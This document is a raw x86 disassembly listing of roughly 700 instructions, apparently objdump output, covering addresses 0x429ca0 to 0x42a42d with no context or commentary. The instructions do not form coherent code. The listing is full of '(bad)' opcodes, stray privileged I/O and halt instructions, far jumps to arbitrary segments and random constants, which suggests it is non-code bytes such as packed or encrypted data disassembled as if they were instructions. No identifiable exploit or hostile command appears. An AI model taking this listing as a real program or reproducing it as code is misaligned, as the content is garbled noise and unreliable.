  429ca0:	imul   ebx,DWORD PTR [ebx+0x6a12a52a],0xffffffae
  429ca7:	pop    ebx
  429ca8:	add    esi,DWORD PTR [ecx+ebp*4-0x56]
  429cac:	push   eax
  429cad:	(bad)  
  429cae:	leave  
  429caf:	cmc    
  429cb0:	mov    ah,0x2
  429cb2:	cmp    ecx,ebx
  429cb4:	mov    eax,0x292e0bb5
  429cb9:	xchg   edx,eax
  429cba:	inc    edi
  429cbb:	mov    dh,0xb0
  429cbd:	adc    DWORD PTR [ebx],eax
  429cbf:	xchg   ecx,eax
  429cc0:	fcomp  st(2)
  429cc2:	push   es
  429cc3:	push   0xaa9a29b4
  429cc8:	stos   BYTE PTR es:[edi],al
  429cc9:	in     al,dx
  429cca:	mov    esi,0x805b5b02
  429ccf:	dec    eax
  429cd0:	ja     0x429c67
  429cd2:	mov    dh,0x3a
  429cd4:	mov    ah,0xa6
  429cd6:	mov    al,ds:0xe3a9d2db
  429cdb:	cmc    
  429cdc:	jmp    0xc2968ab0
  429ce1:	push   es
  429ce2:	mov    bh,0x8d
  429ce4:	ret    0x5d39
  429ce7:	jp     0x429c87
  429ce9:	push   cs
  429cea:	adc    DWORD PTR [ecx+0xa],esp
  429ced:	pop    ss
  429cee:	push   ss
  429cef:	sbb    bl,bl
  429cf1:	mov    esi,0x2e7ba4c2
  429cf6:	mov    al,BYTE PTR [eax+0x24]
  429cf9:	jl     0x429cfb
  429cfb:	jbe    0x429d51
  429cfd:	ins    BYTE PTR es:[edi],dx
  429cfe:	lods   eax,DWORD PTR ds:[esi]
  429cff:	pusha  
  429d00:	inc    ecx
  429d01:	idiv   DWORD PTR ds:0x29adc2c0
  429d07:	push   ds
  429d08:	shr    DWORD PTR [eax+0x5d],0xe5
  429d0c:	xchg   esp,eax
  429d0d:	les    ecx,FWORD PTR [ebp-0x33f8afbe]
  429d13:	or     eax,0xa1bba1f
  429d18:	outs   dx,BYTE PTR ds:[esi]
  429d19:	fist   WORD PTR [eax+0x32c42019]
  429d1f:	stos   DWORD PTR es:[edi],eax
  429d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d21:	cli    
  429d22:	cld    
  429d23:	mov    ss:0x70401d4b,al
  429d29:	pop    edx
  429d2a:	push   esi
  429d2b:	push   eax
  429d2c:	mov    ecx,0xea8d8553
  429d31:	sahf   
  429d32:	(bad)  
  429d33:	scas   al,BYTE PTR es:[edi]
  429d34:	bound  edi,QWORD PTR [ecx+0x5d]
  429d37:	mov    ebx,0x425aaa35
  429d3c:	in     al,dx
  429d3d:	mov    cl,0x77
  429d3f:	idiv   edx
  429d41:	into   
  429d42:	push   ebp
  429d43:	in     eax,dx
  429d44:	(bad)  
  429d45:	inc    edx
  429d46:	fld    st(0)
  429d48:	hlt    
  429d49:	dec    eax
  429d4a:	ds sbb eax,0x685da376
  429d50:	(bad)  
  429d51:	mov    dl,0xd0
  429d53:	imul   edx,DWORD PTR [ebp-0x1c747f2e],0xf950b6e0
  429d5d:	xchg   ecx,eax
  429d5e:	add    dh,dl
  429d60:	adc    dl,BYTE PTR [edi]
  429d62:	dec    esp
  429d63:	out    dx,eax
  429d64:	enter  0xb521,0x60
  429d68:	mov    ds:0xe8458703,al
  429d6d:	dec    ecx
  429d6e:	sbb    al,0xa1
  429d70:	jl     0x429d55
  429d72:	mov    dh,0xdc
  429d74:	adc    esp,DWORD PTR [esp+esi*1+0x1beac6]
  429d7b:	adc    DWORD PTR [ecx-0xf],esp
  429d7e:	mov    dh,0xad
  429d80:	aam    0x76
  429d82:	push   es
  429d83:	jo     0x429dff
  429d85:	add    eax,0x595462c9
  429d8a:	cmp    BYTE PTR [edx+ebx*8+0x36],bl
  429d8e:	ss or  al,0x97
  429d91:	(bad)  
  429d92:	jecxz  0x429da5
  429d94:	cmp    BYTE PTR [ebp-0x5f],0x46
  429d98:	xchg   edi,eax
  429d99:	outs   dx,BYTE PTR ds:[esi]
  429d9a:	jne    0x429dec
  429d9c:	lahf   
  429d9d:	jp     0x429dac
  429d9f:	xor    eax,0x50f582
  429da4:	adc    edx,DWORD PTR [edi-0x13cb35ea]
  429daa:	sub    al,dh
  429dac:	sub    al,0x5c
  429dae:	mov    esi,gs
  429db0:	push   ds
  429db1:	mov    eax,0x66ead4b1
  429db6:	lahf   
  429db7:	stos   DWORD PTR es:[edi],eax
  429db8:	stos   BYTE PTR es:[edi],al
  429db9:	and    esi,esi
  429dbb:	(bad)  
  429dbc:	icebp  
  429dbd:	les    ebp,FWORD PTR [ebp-0x36169723]
  429dc3:	and    eax,DWORD PTR [ecx+0x13]
  429dc6:	fld    TBYTE PTR [ecx+0x4475b5ee]
  429dcc:	dec    ebx
  429dcd:	and    eax,0x899a5464
  429dd2:	adc    al,0xe5
  429dd4:	mov    bh,0xda
  429dd6:	push   esi
  429dd7:	mov    esp,0xf41c95cb
  429ddc:	mov    eax,ds:0xc67b4600
  429de1:	(bad)  
  429de2:	ins    DWORD PTR es:[edi],dx
  429de3:	sbb    edi,DWORD PTR [edi]
  429de5:	xchg   ecx,eax
  429de6:	fisubr DWORD PTR [ebp-0x47b2d495]
  429dec:	ss push 0xf0db6d2d
  429df2:	xchg   dh,dh
  429df4:	inc    dl
  429df6:	out    0xb7,al
  429df8:	adc    esi,DWORD PTR [edi]
  429dfa:	fcomp  DWORD PTR [eax-0x28]
  429dfd:	test   dl,bl
  429dff:	add    al,0xb
  429e01:	mov    bh,0x6e
  429e03:	mov    WORD PTR [edx-0x729128b4],es
  429e09:	in     eax,0x0
  429e0b:	lahf   
  429e0c:	cmp    BYTE PTR [ebx],bh
  429e0e:	and    al,0x4d
  429e10:	xchg   BYTE PTR [edi],dh
  429e12:	add    eax,0xc557400e
  429e17:	and    eax,0x39061035
  429e1c:	push   ecx
  429e1d:	fist   DWORD PTR [ecx+0x2c]
  429e20:	mov    edi,0x5ad96f
  429e25:	push   edx
  429e26:	cdq    
  429e27:	sbb    DWORD PTR [ebx-0x2c],ebp
  429e2a:	inc    edx
  429e2b:	sbb    dh,BYTE PTR [ebx+ebx*2-0x5d77ae45]
  429e32:	sbb    bl,BYTE PTR ds:0xbf8fc62c
  429e38:	push   0xffffffbb
  429e3a:	sub    eax,0xcabcb82c
  429e3f:	ins    BYTE PTR es:[edi],dx
  429e40:	(bad)
  429e43:	add    eax,0xadd05788
  429e48:	mov    edi,esi
  429e4a:	in     al,0xcb
  429e4c:	jecxz  0x429e41
  429e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e4f:	shl    BYTE PTR [esi-0x7f3daad3],1
  429e55:	int    0x6b
  429e57:	adc    edx,DWORD PTR [edx+0x42d10683]
  429e5d:	push   ebx
  429e5e:	out    0x84,al
  429e60:	shl    DWORD PTR [ebp-0x22494935],cl
  429e66:	mov    dh,0x38
  429e68:	inc    esi
  429e69:	jno    0x429e2e
  429e6b:	ins    BYTE PTR es:[edi],dx
  429e6c:	cmp    eax,DWORD PTR [esi+0x5cff26e0]
  429e72:	fcmovu st,st(2)
  429e74:	or     eax,0x2917fb74
  429e79:	push   cs
  429e7a:	mov    al,ds:0x7625619e
  429e7f:	inc    eax
  429e80:	ins    BYTE PTR es:[edi],dx
  429e81:	ins    BYTE PTR es:[edi],dx
  429e82:	iret   
  429e83:	vmread DWORD PTR ds:0x1ad4699b,ebp
  429e8a:	aaa    
  429e8b:	call   0x9357:0x60648c82
  429e92:	mov    ebp,0xdd04d5b4
  429e97:	jge    0x429f08
  429e99:	push   ss
  429e9a:	mov    ds:0xdc1a2586,al
  429e9f:	call   0xeaab5926
  429ea4:	cmp    ecx,DWORD PTR [edi-0x56]
  429ea7:	cdq    
  429ea8:	(bad)  [esi+0x5d]
  429eab:	push   0x2c96a5c
  429eb0:	push   ss
  429eb1:	rcl    ebp,1
  429eb3:	cs stc 
  429eb5:	jmp    0x8e1c:0x685b6da5
  429ebc:	scas   al,BYTE PTR es:[edi]
  429ebd:	mov    al,0x4
  429ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ec0:	pop    ebp
  429ec1:	dec    edx
  429ec2:	jne    0x429f19
  429ec4:	fdiv   QWORD PTR [esi+0x35802f08]
  429eca:	mov    edi,0x82a93653
  429ecf:	pop    ebx
  429ed0:	mov    ebx,0x893fb86d
  429ed5:	repnz sbb eax,0x66a3544
  429edb:	pusha  
  429edc:	and    edx,ebx
  429ede:	lds    esi,FWORD PTR cs:[ebp+0x6994ae9]
  429ee5:	pop    ss
  429ee6:	fiadd  DWORD PTR [ebp-0x53cab552]
  429eec:	sbb    BYTE PTR [edx],ah
  429eee:	add    ch,BYTE PTR [ebx]
  429ef0:	or     eax,0x742c2c1b
  429ef5:	add    BYTE PTR [ecx+0x25fd67d2],cl
  429efb:	jl     0x429ed8
  429efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429efe:	add    ch,BYTE PTR [esi]
  429f00:	xor    esi,ebx
  429f02:	xchg   ebx,eax
  429f03:	sbb    al,0x65
  429f05:	mov    ebp,0x16d07a1
  429f0a:	push   0xf5bb010b
  429f0f:	pop    ebp
  429f10:	inc    eax
  429f11:	adc    DWORD PTR [edx-0x24e4ea4c],ebp
  429f17:	fcos   
  429f19:	fstp   DWORD PTR [ebx+0x96d6db8]
  429f1f:	into   
  429f20:	scas   eax,DWORD PTR es:[edi]
  429f21:	jecxz  0x429f34
  429f23:	mov    eax,ds:0x6c79ae86
  429f28:	sub    al,0x6c
  429f2a:	push   eax
  429f2b:	rcr    DWORD PTR [ebp+ebx*8-0x1b],0xb3
  429f30:	adc    eax,0x41b001c0
  429f35:	sub    eax,0xe2d42664
  429f3a:	mov    ebx,0x681d0bb5
  429f3f:	adc    eax,0xe929d146
  429f44:	cmp    BYTE PTR ds:0x89b668ca,dl
  429f4a:	loop   0x429f8e
  429f4c:	mov    ch,0x17
  429f4e:	std    
  429f4f:	jmp    0x5c383628
  429f54:	pop    ebx
  429f55:	mov    cl,BYTE PTR [ebp+0x3c5bebff]
  429f5b:	das    
  429f5c:	ds mov edx,0x881a96b6
  429f62:	mov    edi,0xe4d1cce5
  429f67:	mov    dl,0x19
  429f69:	or     BYTE PTR [eax-0x254dd74b],bh
  429f6f:	mov    dl,0xeb
  429f71:	mov    dl,BYTE PTR [esi]
  429f73:	fisubr DWORD PTR [esi]
  429f75:	adc    edx,DWORD PTR [ecx-0x5c]
  429f78:	and    edx,DWORD PTR [ebp-0xd]
  429f7b:	jbe    0x429f26
  429f7d:	adc    ch,dl
  429f7f:	dec    edi
  429f80:	test   al,0xd1
  429f82:	test   BYTE PTR [edx-0x1a],0x1b
  429f86:	pop    ebx
  429f87:	push   edi
  429f88:	aam    0xe9
  429f8a:	mov    edx,0x78384742
  429f8f:	pop    ecx
  429f90:	lea    eax,[ebp-0x47bb7a0e]
  429f96:	xor    eax,0xa65f5200
  429f9b:	enter  0xda27,0x16
  429f9f:	fcmovb st,st(2)
  429fa1:	aad    0xe0
  429fa3:	cs mov ah,al
  429fa6:	popa   
  429fa7:	dec    edi
  429fa8:	cmc    
  429fa9:	mov    al,ch
  429fab:	mov    ds:0xf9bb00da,al
  429fb0:	inc    esp
  429fb1:	or     BYTE PTR [eax+eax*2],dh
  429fb4:	pop    ss
  429fb5:	fmul   DWORD PTR [ebp+0x6e1eab68]
  429fbb:	sub    al,0xc1
  429fbd:	mov    dh,0xd1
  429fbf:	outs   dx,BYTE PTR ds:[esi]
  429fc0:	sub    al,0x10
  429fc2:	xlat   BYTE PTR ds:[ebx]
  429fc3:	and    DWORD PTR [edx+0x18],edi
  429fc6:	xchg   ebp,eax
  429fc7:	dec    eax
  429fc8:	aaa    
  429fc9:	dec    edx
  429fca:	(bad)  [esi-0xa872493]
  429fd0:	stc    
  429fd1:	jge    0x42a01f
  429fd3:	out    0xac,al
  429fd5:	and    eax,DWORD PTR [edi-0x1d]
  429fd8:	jno    0x429f87
  429fda:	mov    ah,0x41
  429fdc:	mov    ah,0x14
  429fde:	ja     0x42a052
  429fe0:	pop    eax
  429fe1:	es adc al,0x4d
  429fe4:	inc    ecx
  429fe5:	or     ebx,ebx
  429fe7:	into   
  429fe8:	xchg   dh,bh
  429fea:	xor    cl,BYTE PTR [ecx-0x58]
  429fed:	xor    bh,BYTE PTR [ecx+0x52c1b041]
  429ff3:	and    al,0x49
  429ff5:	xchg   ebp,eax
  429ff6:	pop    ebx
  429ff7:	popa   
  429ff8:	push   ebx
  429ff9:	shl    DWORD PTR [esi-0x398b3cd5],0x7d
  42a000:	pop    edi
  42a001:	dec    eax
  42a002:	retf   0xd1bf
  42a005:	mov    dh,0x5b
  42a007:	rol    edx,1
  42a009:	xor    ebp,DWORD PTR [ebx+0x75]
  42a00c:	push   esi
  42a00d:	shl    dh,cl
  42a00f:	push   ds
  42a010:	add    BYTE PTR [edi+0x15],ah
  42a013:	in     eax,0xb7
  42a015:	lods   eax,DWORD PTR ds:[esi]
  42a016:	sub    eax,0x67fb86b2
  42a01b:	sahf   
  42a01c:	stc    
  42a01d:	ins    DWORD PTR es:[edi],dx
  42a01e:	add    dl,cl
  42a020:	icebp  
  42a021:	adc    eax,ecx
  42a023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a024:	mov    bh,BYTE PTR [eax]
  42a026:	mov    DWORD PTR [esi],0xdadd8771
  42a02c:	inc    edx
  42a02d:	push   ebp
  42a02e:	fisub  DWORD PTR ds:0x402f20e1
  42a034:	add    bl,bl
  42a036:	push   ebp
  42a037:	je     0x429fdc
  42a039:	mov    DWORD PTR [edi],esp
  42a03b:	mov    eax,0x56bd8ff9
  42a040:	bound  esi,QWORD PTR [edx+0x1042dbb5]
  42a046:	sub    ebx,DWORD PTR [ebx+0x3e178be1]
  42a04c:	mov    eax,0xed6d6db5
  42a051:	sbb    ah,bl
  42a053:	cmc    
  42a054:	clc    
  42a055:	(bad)  
  42a056:	xchg   ecx,eax
  42a057:	ret    
  42a058:	into   
  42a059:	popa   
  42a05a:	shr    BYTE PTR [ebp-0x57],cl
  42a05d:	adc    eax,0x71891496
  42a062:	mov    ch,BYTE PTR [edi+0x7a]
  42a065:	stos   BYTE PTR es:[edi],al
  42a066:	pop    edx
  42a067:	mov    bh,0x8d
  42a069:	(bad)  
  42a06a:	jo     0x42a016
  42a06c:	sbb    eax,0xc556015e
  42a071:	mov    dh,0x95
  42a073:	pop    esp
  42a074:	inc    ecx
  42a075:	lods   al,BYTE PTR ds:[esi]
  42a076:	jno    0x42a0c7
  42a078:	mov    ds:0xa83e2dda,al
  42a07d:	sbb    eax,0x1d936fd9
  42a082:	mov    esp,0xa2b40428
  42a087:	stos   DWORD PTR es:[edi],eax
  42a088:	ss sub eax,0x2ad858dc
  42a08e:	setno  ch
  42a091:	jmp    0x6d11:0xe2943932
  42a098:	hlt    
  42a099:	mov    ch,0x2c
  42a09b:	mov    edx,esp
  42a09d:	mov    ch,0x79
  42a09f:	or     al,0x61
  42a0a1:	mov    DWORD PTR [edx+0x6a],ebx
  42a0a4:	rol    BYTE PTR [esi-0x882418d],0xa0
  42a0ab:	mov    al,0x1
  42a0ad:	push   0x745d7aa3
  42a0b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a0b3:	mov    ds:0x5cd8d85d,eax
  42a0b8:	data16 sub ch,al
  42a0bb:	popf   
  42a0bc:	mov    ds:0x16753281,al
  42a0c1:	push   ss
  42a0c2:	mov    dh,0x76
  42a0c4:	push   esp
  42a0c5:	in     eax,0x8f
  42a0c7:	mov    dh,0x9e
  42a0c9:	xchg   ecx,eax
  42a0ca:	int    0x88
  42a0cc:	sti    
  42a0cd:	shl    BYTE PTR [esi+0x4],1
  42a0d0:	fdiv   QWORD PTR ds:0xc9aa8a29
  42a0d6:	inc    esp
  42a0d7:	adc    DWORD PTR [esi],edx
  42a0d9:	sbb    dl,cl
  42a0db:	mov    eax,0xc6df2cdc
  42a0e0:	out    0x52,al
  42a0e2:	mov    edi,0x8256c6d6
  42a0e7:	dec    esi
  42a0e8:	and    esi,DWORD PTR [edi]
  42a0ea:	sbb    esp,DWORD PTR [ebx]
  42a0ec:	sub    BYTE PTR [eax-0x2c1df9bf],bh
  42a0f2:	pop    ebp
  42a0f3:	mov    ebx,0x800d40be
  42a0f8:	lods   eax,DWORD PTR ds:[esi]
  42a0f9:	ins    DWORD PTR es:[edi],dx
  42a0fa:	sub    bl,dl
  42a0fc:	dec    ebp
  42a0fd:	js     0x42a101
  42a0ff:	push   cs
  42a100:	mov    eax,0x851b1b4c
  42a105:	lock xchg esi,eax
  42a107:	out    0xb4,eax
  42a109:	imul   esp,DWORD PTR [edi+0x175576d8],0x43
  42a110:	test   al,0xdd
  42a112:	cwde   
  42a113:	addr16 push ecx
  42a115:	or     bh,cl
  42a117:	jne    0x42a0f4
  42a119:	sbb    bl,BYTE PTR [edi-0xc2a113c]
  42a11f:	imul   edx,ebp,0xffffffdd
  42a122:	cmp    esp,DWORD PTR [eax+ebp*2-0x7e]
  42a126:	ins    DWORD PTR es:[edi],dx
  42a127:	pop    es
  42a128:	gs mov esp,0xb91dda5c
  42a12e:	push   edx
  42a12f:	xchg   esi,eax
  42a130:	das    
  42a131:	pop    ebp
  42a132:	pop    eax
  42a133:	mov    ch,0x50
  42a135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a136:	jge    0x42a13a
  42a138:	xchg   ebp,eax
  42a139:	and    DWORD PTR [eax],eax
  42a13b:	inc    DWORD PTR [ecx-0x2f4524b5]
  42a141:	push   ss
  42a142:	mov    ds:0x55400e71,eax
  42a147:	mov    al,0x85
  42a149:	popf   
  42a14a:	das    
  42a14b:	fmul   QWORD PTR [edx]
  42a14d:	inc    ebp
  42a14e:	pop    ebx
  42a14f:	and    ecx,ebx
  42a151:	mov    al,0x35
  42a153:	or     al,0xd3
  42a155:	dec    edx
  42a156:	push   ebp
  42a157:	sub    BYTE PTR [edx],ch
  42a159:	jo     0x42a13b
  42a15b:	fild   DWORD PTR es:[ebp-0x546a224a]
  42a162:	outs   dx,BYTE PTR ds:[esi]
  42a163:	lds    esp,FWORD PTR [ebx-0x71]
  42a166:	mov    eax,0x846ea1ba
  42a16b:	(bad)  [esi+0x292f6b6d]
  42a171:	mov    ?,ebx
  42a173:	stos   BYTE PTR es:[edi],al
  42a174:	push   eax
  42a175:	hlt    
  42a176:	xor    eax,0xd10dadf3
  42a17b:	test   DWORD PTR [esi+0x60],esi
  42a17e:	xchg   edx,eax
  42a17f:	xchg   edx,eax
  42a180:	push   edx
  42a181:	daa    
  42a182:	and    esi,DWORD PTR [edi]
  42a184:	xchg   edi,eax
  42a185:	outs   dx,BYTE PTR ds:[esi]
  42a186:	push   esp
  42a187:	mov    edx,0xe38cbf6d
  42a18c:	jmp    0x42a205
  42a18e:	stos   BYTE PTR es:[edi],al
  42a18f:	xchg   esp,eax
  42a190:	pop    ebp
  42a191:	jge    0x42a1e5
  42a193:	or     ebp,ebp
  42a195:	push   esi
  42a196:	dec    edx
  42a197:	inc    esp
  42a198:	ret    0x91a7
  42a19b:	std    
  42a19c:	xchg   esi,eax
  42a19d:	mov    eax,ds:0x7db012d
  42a1a2:	add    ebx,0x7
  42a1a5:	fwait
  42a1a6:	jge    0x42a151
  42a1a8:	fld    TBYTE PTR [esi+0x6e]
  42a1ab:	imul   esi,DWORD PTR [ecx+0x2e],0x36
  42a1af:	repnz (bad) [edi-0x76f3d35d]
  42a1b6:	mov    ds:0x6f6d6c01,eax
  42a1bb:	and    BYTE PTR [esi-0x71],ch
  42a1be:	loopne 0x42a1a4
  42a1c0:	push   ebp
  42a1c1:	sub    dh,BYTE PTR [esi+0x35ebdd76]
  42a1c7:	outs   dx,BYTE PTR ds:[esi]
  42a1c8:	aam    0x61
  42a1ca:	cmp    ch,BYTE PTR [edx-0x45]
  42a1cd:	mov    cl,0x28
  42a1cf:	fxch   st(1)
  42a1d1:	pop    edi
  42a1d2:	push   0xaf0a880
  42a1d7:	mov    dh,0xd1
  42a1d9:	inc    ecx
  42a1da:	fsub   st(4),st
  42a1dc:	sub    eax,0x57494246
  42a1e1:	inc    edx
  42a1e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1e3:	mov    dh,0x41
  42a1e5:	sbb    edx,ebp
  42a1e7:	dec    esp
  42a1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1e9:	jmp    0x42a174
  42a1eb:	mov    ah,0xf5
  42a1ed:	push   es
  42a1ee:	jmp    0xcd65:0xd9acd6c2
  42a1f5:	sub    BYTE PTR [edi+0x6b70046f],cl
  42a1fb:	fld    TBYTE PTR [ebx-0x61]
  42a1fe:	cmp    ebx,DWORD PTR [edi]
  42a200:	in     al,dx
  42a201:	sub    al,0x98
  42a203:	inc    ecx
  42a204:	add    bl,BYTE PTR [ebx+0x54]
  42a207:	pop    ebp
  42a208:	push   ebx
  42a209:	enter  0x3b38,0x39
  42a20d:	push   esi
  42a20e:	xor    DWORD PTR [esi-0x41d78736],0xa5b604ce
  42a218:	jbe    0x42a213
  42a21a:	add    esi,DWORD PTR [edx+0x0]
  42a21d:	jmp    0x42a211
  42a21f:	sub    ecx,DWORD PTR [esi]
  42a221:	(bad)  
  42a222:	retf   0x97bc
  42a225:	mov    dh,0x75
  42a227:	ror    DWORD PTR ds:0x9e45905f,1
  42a22d:	data16 sbb bl,BYTE PTR [ebx+0x155a02ef]
  42a234:	fisttp DWORD PTR [ebx]
  42a236:	or     edx,DWORD PTR [ebp-0x55e4a43a]
  42a23c:	push   ss
  42a23d:	adc    dl,BYTE PTR [ebx]
  42a23f:	(bad)  
  42a240:	fld    DWORD PTR [di]
  42a244:	push   0xffffffdb
  42a246:	xchg   esi,eax
  42a247:	dec    edx
  42a248:	add    cl,BYTE PTR [ebx]
  42a24a:	push   edx
  42a24b:	retf   
  42a24c:	pop    ds
  42a24d:	push   cs
  42a24e:	popa   
  42a24f:	xchg   esi,eax
  42a250:	cmp    al,BYTE PTR [edx-0x5c51ad73]
  42a256:	out    dx,eax
  42a257:	mov    esp,0xe5546863
  42a25c:	aaa    
  42a25d:	mov    bh,cl
  42a25f:	mov    dh,0x0
  42a261:	and    eax,esp
  42a263:	shl    BYTE PTR [ebp+0x57db6dc2],1
  42a269:	out    0x3e,eax
  42a26b:	jo     0x42a290
  42a26d:	(bad)  
  42a26e:	xor    edi,esi
  42a270:	stos   BYTE PTR es:[edi],al
  42a271:	ins    BYTE PTR es:[edi],dx
  42a272:	pop    ss
  42a273:	mov    dh,0x85
  42a275:	xchg   esp,eax
  42a276:	(bad)  
  42a277:	test   al,0x1d
  42a279:	mov    bl,0x67
  42a27b:	iret   
  42a27c:	loope  0x42a286
  42a27e:	mov    edi,0x5742d6c0
  42a283:	int3   
  42a284:	out    0x8b,al
  42a286:	and    edi,ebx
  42a288:	mov    DWORD PTR [ebx+edx*2-0x4c],edx
  42a28c:	sub    eax,0xb18f246a
  42a291:	sar    DWORD PTR [edx-0x1b],1
  42a294:	fwait
  42a295:	popa   
  42a296:	imul   edx,ebp,0xffffffcb
  42a299:	cmc    
  42a29a:	jg     0x42a26a
  42a29c:	pop    esi
  42a29d:	push   0xed1b0300
  42a2a2:	xchg   esi,eax
  42a2a3:	stos   DWORD PTR es:[edi],eax
  42a2a4:	fisubr WORD PTR [ecx]
  42a2a6:	xchg   edi,eax
  42a2a7:	sbb    BYTE PTR [ebx],dh
  42a2a9:	jp     0x42a27d
  42a2ab:	mov    edx,0x8da23adb
  42a2b0:	ss test al,0xe8
  42a2b3:	fiadd  WORD PTR [eax-0x26]
  42a2b6:	inc    ebp
  42a2b7:	mov    esp,0x61697685
  42a2bc:	or     ecx,DWORD PTR [edi-0x13]
  42a2bf:	adc    al,0x3f
  42a2c1:	fnstenv [ecx-0xc]
  42a2c4:	ins    DWORD PTR es:[edi],dx
  42a2c5:	sub    eax,0xdd13a0b5
  42a2ca:	sti    
  42a2cb:	adc    eax,0x6c688719
  42a2d0:	shl    DWORD PTR [esi-0x43cde608],0x8e
  42a2d7:	adc    BYTE PTR [ecx],bh
  42a2d9:	shr    BYTE PTR [ebp-0x5bff2253],0x5d
  42a2e0:	es adc al,0x25
  42a2e3:	les    eax,FWORD PTR [edi+0x2a]
  42a2e6:	pop    eax
  42a2e7:	(bad)  
  42a2e9:	push   esp
  42a2ea:	cs jne 0x42a29d
  42a2ed:	and    eax,0xa43800e2
  42a2f2:	mov    eax,0xf15808d0
  42a2f7:	xchg   edx,eax
  42a2f8:	out    0x67,al
  42a2fa:	pusha  
  42a2fb:	pusha  
  42a2fc:	mov    ss:0xe2dca6b6,al
  42a302:	lods   eax,DWORD PTR ds:[esi]
  42a303:	loop   0x42a307
  42a305:	add    eax,DWORD PTR [ecx+0x2da7a585]
  42a30b:	jnp    0x42a2f9
  42a30d:	scas   al,BYTE PTR es:[edi]
  42a30e:	jl     0x42a33f
  42a310:	imul   BYTE PTR [esi+0x5b]
  42a313:	fistp  DWORD PTR [edx+0x7b]
  42a316:	cmp    ah,bl
  42a318:	dec    edx
  42a319:	retf   
  42a31a:	popf   
  42a31b:	ja     0x42a33b
  42a31d:	mov    ebp,DWORD PTR [ecx+0x1ad5b444]
  42a323:	test   eax,0x85ef5b0a
  42a328:	ins    DWORD PTR es:[edi],dx
  42a329:	popa   
  42a32a:	popa   
  42a32b:	sti    
  42a32c:	test   eax,0x898c0d86
  42a331:	dec    esp
  42a332:	jmp    0x42a37f
  42a334:	pop    ebx
  42a335:	add    edx,ecx
  42a337:	dec    esi
  42a338:	sub    bl,BYTE PTR [ebp+0x19]
  42a33b:	das    
  42a33c:	inc    edx
  42a33d:	push   eax
  42a33e:	pop    edi
  42a33f:	aam    0xc0
  42a341:	rol    BYTE PTR [edx],cl
  42a343:	leave  
  42a344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a345:	add    bh,ah
  42a347:	and    DWORD PTR [edx-0x4f525a7d],edi
  42a34d:	aam    0x7c
  42a34f:	adc    dl,al
  42a351:	mov    ebp,0xb71af8fe
  42a356:	lea    esi,[esi+0x6b]
  42a359:	shl    bh,1
  42a35b:	cs pop ebx
  42a35d:	in     al,dx
  42a35e:	adc    eax,0x96016873
  42a363:	xchg   ebp,eax
  42a364:	outs   dx,BYTE PTR ds:[esi]
  42a365:	dec    ebp
  42a366:	add    eax,0x8847349e
  42a36b:	xchg   DWORD PTR [edx],ebx
  42a36d:	push   esi
  42a36e:	pusha  
  42a36f:	fld    TBYTE PTR [esi]
  42a371:	into   
  42a372:	lahf   
  42a373:	outs   dx,DWORD PTR ds:[esi]
  42a374:	inc    ecx
  42a375:	adc    al,0x3e
  42a377:	sahf   
  42a378:	lock xor eax,0xe223ada5
  42a37e:	addr16 jp 0x42a30c
  42a381:	cmc    
  42a382:	sub    al,0xc2
  42a384:	pop    edi
  42a385:	lods   eax,DWORD PTR ds:[esi]
  42a386:	jno    0x42a363
  42a388:	xchg   esi,eax
  42a389:	fcmovu st,st(1)
  42a38b:	push   ebx
  42a38c:	xlat   BYTE PTR ds:[ebx]
  42a38d:	imul   edi,DWORD PTR [edi-0x225b7bb2],0xffffff96
  42a394:	mov    dh,0x85
  42a396:	xchg   ebx,eax
  42a397:	push   ss
  42a398:	mov    ah,0x2f
  42a39a:	in     eax,0x89
  42a39c:	pop    esp
  42a39d:	push   eax
  42a39e:	jb     0x42a36a
  42a3a0:	lods   eax,DWORD PTR ds:[esi]
  42a3a1:	mov    DWORD PTR [ebp+0x415e5fb6],ebp
  42a3a7:	sub    BYTE PTR [eax+0x10],bl
  42a3aa:	push   ecx
  42a3ab:	and    esp,DWORD PTR [ecx]
  42a3ad:	fsubr  DWORD PTR [esi-0x4b]
  42a3b0:	repnz gs or eax,0x29aaae68
  42a3b7:	fidiv  DWORD PTR [ebp-0x154a4e50]
  42a3bd:	pop    edx
  42a3be:	aaa    
  42a3bf:	test   DWORD PTR [eax],ebx
  42a3c1:	call   FWORD PTR [eax-0x40]
  42a3c4:	xchg   dl,bl
  42a3c6:	inc    eax
  42a3c7:	mov    ah,0xa6
  42a3c9:	mov    dl,0x9c
  42a3cb:	outs   dx,BYTE PTR ds:[esi]
  42a3cc:	repnz hlt 
  42a3ce:	add    al,0xdc
  42a3d0:	dec    edx
  42a3d1:	mov    bh,0x2b
  42a3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a3d4:	fnstenv [ebp-0x15a3b2bc]
  42a3da:	add    DWORD PTR [eax+0x11825d85],0x5b1d6a0a
  42a3e4:	mov    dh,0xd1
  42a3e6:	add    eax,0x1b084eb1
  42a3eb:	or     dl,BYTE PTR [esi+ecx*4+0x3e]
  42a3ef:	sub    ch,BYTE PTR [esi-0x35]
  42a3f2:	ret    0x469
  42a3f5:	imul   ebp,DWORD PTR [eax+eax*4+0x1b],0xffffffff
  42a3fa:	mov    dh,0x76
  42a3fc:	pop    ebx
  42a3fd:	push   0xa628adbb
  42a402:	stos   BYTE PTR es:[edi],al
  42a403:	pop    esi
  42a404:	sub    BYTE PTR [ebx-0x11],dl
  42a407:	jbe    0x42a3bf
  42a409:	pop    ebp
  42a40a:	fcom   DWORD PTR [esi]
  42a40c:	popf   
  42a40d:	rcr    DWORD PTR ds:0x22f9a655,0xd1
  42a414:	or     BYTE PTR [bx+di+0x70],dl
  42a418:	(bad)  [esi-0x7a97f935]
  42a41e:	lods   eax,DWORD PTR ds:[esi]
  42a41f:	(bad)  
  42a420:	int    0x89
  42a422:	mov    eax,0x7d9cd4b5
  42a427:	fidiv  DWORD PTR [ebp+0x1c]
  42a42a:	pop    es
  42a42b:	repnz cwde 
  42a42d:	mov    BYTE PTR [ebx],bl
